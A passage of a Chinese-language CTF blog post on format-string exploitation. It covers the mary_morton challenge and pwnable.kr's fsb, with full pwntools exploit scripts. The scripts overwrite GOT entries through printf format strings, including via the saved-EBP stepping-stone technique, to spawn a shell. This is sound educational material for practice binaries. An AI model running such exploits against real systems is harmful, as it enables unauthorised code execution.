<p>程序中给了后门函数,但是没有shell。<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sub_4008DA()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">return</span> <span class="title">system</span><span class="params">(<span class="string">"/bin/cat ./flag"</span>)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我写这道题的思路有两个：可以利用格式化串漏洞修改printf函数的got表，将其修改为system函数的plt，再次执行fsb函数时，输入/bin/sh，则可以拿到shell。<br>也可以修改_stack_chk_fail 的got表，将其修改为这个后门函数的地址，当执行Stackoverflow函数时，破坏掉canary，则会执行后门函数。<br>exp采用的是思路1：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"><span class="comment">#a=remote("111.198.29.45","31730")</span></span><br><span class="line"><span class="keyword">a</span>=<span class="built_in">process</span>(<span class="string">"./mary_morton"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./mary_morton"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">a</span>.recvuntil(<span class="string">"3. Exit the battle \n"</span>)</span><br><span class="line"><span class="keyword">a</span>.sendline(<span class="string">"2"</span>)</span><br><span class="line">printf_got=elf.got[<span class="string">"printf"</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">"system"</span>]</span><br><span class="line">length2=<span class="built_in">len</span>(str(system_plt))</span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">8</span>-length2)+<span class="string">'%'</span>+str(system_plt<span class="number">-8</span>+length2)+<span class="string">'c'</span>+<span class="string">"%8$lln"</span>+p64(printf_got)</span><br><span class="line">print payload</span><br><span class="line"><span class="keyword">a</span>.<span class="built_in">send</span>(payload)</span><br><span class="line"><span class="keyword">a</span>.recv()</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">a</span>.sendline(<span class="string">"2"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">a</span>.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="keyword">a</span>.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="格式化串不在栈中："><a href="#格式化串不在栈中：" class="headerlink" title="格式化串不在栈中："></a>格式化串不在栈中：</h3><p>某些时候你输入的格式化串不是保存在栈中的，这些字符串可能保存在bss段或者堆中，那么你使用多少%p，都不能找到你写入的格式化串。例如：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">   <span class="built_in">printf</span>(a);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里的字符串a，就是全局变量，保存在bss段。<br><img src="/2019/02/22/格式化串漏洞利用总结/7.png" alt=""><br>不管你用多少%p，都找不到这个格式化串。<br>这样就需要找个跳板——栈中保存的EBP/RBP。</p>
<h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>当函数初始化完成后(对汇编函数调用过程不了解请看原先笔记)，在当前函数栈帧中，EBP指向上一个函数栈帧的EBP，即saved EBP。如图所示：<br><img src="/2019/02/22/格式化串漏洞利用总结/8.png" alt=""><br>那么就可以将saved ebp指向的内存修改为你想要修改的内存单元的地址。即第一次利用格式化串漏洞，将想要修改的内存单元的指针写入栈中。<br>例如，你想修改某个函数的got表项，第一次修改后如图所示：<br><img src="/2019/02/22/格式化串漏洞利用总结/9.png" alt=""><br>因为saved ebp 本来就保存在栈中，且当前EBP和printf的参数——格式化串的距离是固定不变的，所以可以直接使用 <code>%number$n</code>找到saved ebp，将saved ebp指向的内存单元修改掉。<br>又因为上一个函数的EBP，即当前函数的栈帧中保存的saved ebp，和printf的参数也是固定不变的，所以第二次利用格式化串找到第一次修改的地址，即可修改目标，如图所示：<br><img src="/2019/02/22/格式化串漏洞利用总结/10.png" alt=""><br>图中的4和9，都是随便写的，具体数值需要根据题目调试出来。</p>
<p>利用模板如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一次漏洞利用：</span><br><span class="line">payload='%'+str(想要修改的内存单元的地址)+‘c’+‘%offset1$n’</span><br><span class="line">offset1= 格式化串和EBP的偏移</span><br><span class="line"><span class="section">第二次漏洞利用:</span></span><br><span class="line">payload='%'+str(想要修改的数值)+‘c’+<span class="string">"%offset2$n"</span></span><br><span class="line">offset2= 格式化串和saved ebp的偏移</span><br></pre></td></tr></table></figure></p>
<p>其中第一次漏洞利用是将地址写入栈中，第二次才是真正的修改。</p>
<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>pwnable.kr 中的fsb，就是格式化串不在栈中的。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;alloca.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> key;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> buf2[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsb</span><span class="params">(<span class="keyword">char</span>** argv, <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>* args[]=&#123;<span class="string">"/bin/sh"</span>, <span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">char</span>*** pargv = &amp;argv;</span><br><span class="line">	<span class="keyword">char</span>*** penvp = &amp;envp;</span><br><span class="line">        <span class="keyword">char</span>** arg;</span><br><span class="line">        <span class="keyword">char</span>* c;</span><br><span class="line">        <span class="keyword">for</span>(arg=argv;*arg;arg++) <span class="keyword">for</span>(c=*arg; *c;c++) *c=<span class="string">'\0'</span>;</span><br><span class="line">        <span class="keyword">for</span>(arg=envp;*arg;arg++) <span class="keyword">for</span>(c=*arg; *c;c++) *c=<span class="string">'\0'</span>;</span><br><span class="line">	*pargv=<span class="number">0</span>;</span><br><span class="line">	*penvp=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Give me some format strings(%d)\n"</span>, i+<span class="number">1</span>);</span><br><span class="line">		read(<span class="number">0</span>, buf, <span class="number">100</span>);</span><br><span class="line">		<span class="built_in">printf</span>(buf); <span class="comment">//漏洞在这里</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Wait a sec...\n"</span>);</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"key : \n"</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf2, <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> pw = strtoull(buf2, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span>(pw == key)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">                execve(args[<span class="number">0</span>], args, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect key \n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span>( fd==<span class="number">-1</span> || read(fd, &amp;key, <span class="number">8</span>) != <span class="number">8</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Error, tell admin\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	close(fd);</span><br><span class="line">	alloca(<span class="number">0x12345</span> &amp; key);<span class="comment">//在栈中申请空间，申请的大小是随机化的</span></span><br><span class="line">	fsb(argv, envp); <span class="comment">// exploit this format string bug!</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>利用思路就是将sleep函数的got表项修改为execve(“/bin/sh”,0,0)的地址。<br>百度了一下alloca这个函数，是在栈中申请空间，类似于malloc，由于这个申请的栈空间的大小是不一定的，也就是说fsb这个函数栈帧的基地址EBP和ESP都是不确定的，则需要通过泄露栈中数据计算出offset。<br>在printf处下个断点。<br><img src="/2019/02/22/格式化串漏洞利用总结/12.png" alt=""><br>此时esp指向的是格式化字符串。<br>通过泄露图中0xfffeccf8所指向的内容再减去80，即可算出ESP，再泄露出saved ebp，两者相减再除以4，即可算出offset。<br>对应的payload的如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">"%14$08x%18$08x"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">esp=int(p.recv(8),16)-0x50</span><br><span class="line">ebp=int(p.recv(8),16)</span><br><span class="line">offset=(ebp-esp)/4</span><br></pre></td></tr></table></figure></p>
<p>完整的exp如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">p=ssh(host='pwnable.kr',port=2222,user='fsb',password='guest').run('/home/fsb/fsb')</span><br><span class="line">sleep_got=0x0804a008</span><br><span class="line">system=0x080486ab</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(1)\n"</span>) <span class="comment">#第一次利用，计算offset</span></span><br><span class="line">payload=<span class="string">"%14$08x%18$08x"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">esp=int(p.recv(8),16)-0x50</span><br><span class="line">ebp=int(p.recv(8),16)</span><br><span class="line">offset=(ebp-esp)/4</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(2)\n"</span>)</span><br><span class="line">payload=<span class="string">"%134520840c"</span>+<span class="string">"%18$n"</span> <span class="comment">#修改saved ebp所指向的内容为sleep表项地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(3)\n"</span>)</span><br><span class="line">payload=<span class="string">"AAA%134514344c"</span>+<span class="string">"%"</span>+str(offset)+<span class="string">"$n"</span> <span class="comment">#修改为getshell的地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(4)\n"</span>)</span><br><span class="line">payload=<span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/pwnable/" rel="tag"># pwnable</a>
          
            <a href="/tags/fmtstr/" rel="tag"># fmtstr</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/02/11/x86汇编-函数调用/" rel="next" title="x86汇编 函数调用">
                <i class="fa fa-chevron-left"></i> x86汇编 函数调用
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/03/08/i春秋pwnable-writeup/" rel="prev" title="i春秋pwnable-writeup">
                i春秋pwnable-writeup <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/my.jpg" alt="ditto">
            
              <p class="site-author-name" itemprop="name">ditto</p>
              <p class="site-description motion-element" itemprop="description">pwn for fun</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">26</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">6</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Dittozzz" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预备知识："><span class="nav-number">2.</span> <span class="nav-text">预备知识：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#泄露内存："><span class="nav-number">3.</span> <span class="nav-text">泄露内存：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#泄露got表项内容："><span class="nav-number">3.1.</span> <span class="nav-text">泄露got表项内容：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#32位程序："><span class="nav-number">3.1.1.</span> <span class="nav-text">32位程序：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#64位程序："><span class="nav-number">3.1.2.</span> <span class="nav-text">64位程序：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改内存："><span class="nav-number">4.</span> <span class="nav-text">修改内存：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#32位程序：-1"><span class="nav-number">4.0.1.</span> <span class="nav-text">32位程序：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#64位程序：-1"><span class="nav-number">4.0.2.</span> <span class="nav-text">64位程序：</span></a></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#格式化串不在栈中："><span class="nav-number">5.</span> <span class="nav-text">格式化串不在栈中：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#预备知识"><span class="nav-number">5.1.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#例题"><span class="nav-number">5.2.</span> <span class="nav-text">例题</span></a></li></ol></li></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ditto</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">54.2k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>



        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
